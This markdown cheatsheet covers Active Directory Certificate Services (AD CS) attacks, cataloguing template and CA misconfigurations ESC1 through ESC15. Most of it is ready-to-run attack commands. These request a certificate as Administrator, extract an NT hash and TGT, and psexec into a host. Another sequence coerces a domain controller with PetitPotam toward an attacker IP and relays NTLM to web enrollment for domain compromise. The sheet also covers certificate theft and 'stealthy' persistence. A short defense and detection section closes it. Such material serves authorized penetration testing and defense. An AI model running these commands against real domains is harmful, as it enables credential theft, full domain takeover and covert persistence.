---
tags: [hacking, active-directory, windows, adcs, certipy, esc]
type: cheatsheet
source: compiled reference (AD CS / ESC) — added beyond base cheatsheet
last-verified: 2026-09-03
---

# AD CS Attacks

## Up
- [[Active Directory]]

**Active Directory Certificate Services (AD CS)** is a PKI that issues certificates usable for authentication (PKINIT). Misconfigured certificate templates ("ESC" issues) are among the most reliable modern domain-compromise paths — and weren't in the base cheatsheet. Tooling: **Certipy** (Linux) / **Certify + Rubeus** (Windows).

---

## Why it's powerful
A certificate that permits **client authentication** can be used to get a **TGT** (PKINIT) and the account's **NT hash** — and certs **survive password resets** (great persistence). Enrollment often only needs low-priv rights.

```bash
# find CAs + vulnerable templates (the first command to run)
certipy-ad find -u user@corp.local -p pass -dc-ip <dc> -vulnerable -stdout
certipy-ad find -u user@corp.local -p pass -dc-ip <dc> -old-bloodhound   # feed BloodHound
```

---

## The ESC catalogue (summary)

| ESC | Misconfiguration | Impact |
|---|---|---|
| **ESC1** | Template allows enrollee to supply **SAN** + Client Auth + low-priv enroll | Request cert **as any user** (e.g. Administrator) → their TGT |
| **ESC2** | Template with **Any Purpose**/no EKU | Use cert broadly (as ESC1-like) |
| **ESC3** | Enrollment Agent template | Request certs **on behalf of** others |
| **ESC4** | **Write access to a template** | Rewrite it into ESC1, then exploit |
| **ESC5** | Write access to CA/PKI objects (ACL) | Full PKI control |
| **ESC6** | CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` | SAN in any request → impersonate |
| **ESC7** | **Manage CA / Manage Certificates** rights | Approve own requests / enable SAN |
| **ESC8** | **HTTP Web Enrollment + NTLM** (no EPA) | **Relay** coerced auth → cert (see [[NTLM Relay & Coercion]]) |
| ESC9/10/11 | No-security-extension / weak mapping / RPC enrollment | Various impersonation |
| ESC13/14/15 | OID group links / weak explicit mappings / schema v1 (EKUwu) | Impersonation |

---

## ESC1 (the classic) — request a cert as Administrator
```bash
# 1) template lets us specify SAN + allows client auth + we can enroll
certipy-ad req -u user@corp.local -p pass -dc-ip <dc> -ca 'CORP-CA' \
  -template 'VulnTemplate' -upn administrator@corp.local
#    → administrator.pfx

# 2) authenticate with the cert → TGT + NT hash
certipy-ad auth -pfx administrator.pfx -dc-ip <dc>
#    → prints Administrator's NT hash + a TGT (.ccache)
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@<target>
```

## ESC8 — coerce + relay to Web Enrollment → DC compromise
```bash
# terminal 1: relay to the CA's web enrollment, request a DC cert
impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# terminal 2: coerce the DC to authenticate to us
petitpotam.py <attacker-ip> <dc-ip>
# → DC01$ certificate → certipy auth → DC TGT → DCSync (domain compromise)
certipy-ad auth -pfx dc01.pfx -dc-ip <dc>
```

## ESC7 (Manage CA) — approve your own SAN request; ESC4 — rewrite a template
```bash
certipy-ad template -u user@corp.local -p pass -template Vuln -save-old   # ESC4: make it vulnerable, then req as ESC1, then restore
```

---

## Certificate persistence (THEFT/PERSIST)
- **THEFT** — export existing certs/keys from a machine (`certipy-ad cert`, Mimikatz `crypto::certificates /export`).
- **PERSIST** — enroll a cert for a user/machine you control; it authenticates for the cert's lifetime (often 1 year+), **surviving password changes**. Great stealthy persistence.

---

## Detection & Defense
- Audit templates: no enrollee-supplied SAN on client-auth templates, require manager approval, restrict enroll rights (fixes ESC1/2/3).
- Remove `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6); lock down CA/template ACLs (ESC4/5/7).
- **Enable EPA + disable HTTP** on Web Enrollment (ESC8). Monitor Event **4886/4887** (cert requested/issued) and unusual SANs.

---

## Takeaways
- **`certipy find -vulnerable` first** — it names the exact ESC and how to exploit it.
- **ESC1** (SAN + client auth) → instant "cert as Administrator"; **ESC8** (coerce + relay) → DC compromise.
- Certs = **stealthy persistence** that survives password resets.
- Chains with [[NTLM Relay & Coercion]] (ESC8) and [[Delegation Attacks]] (shadow creds also yield certs/TGTs).
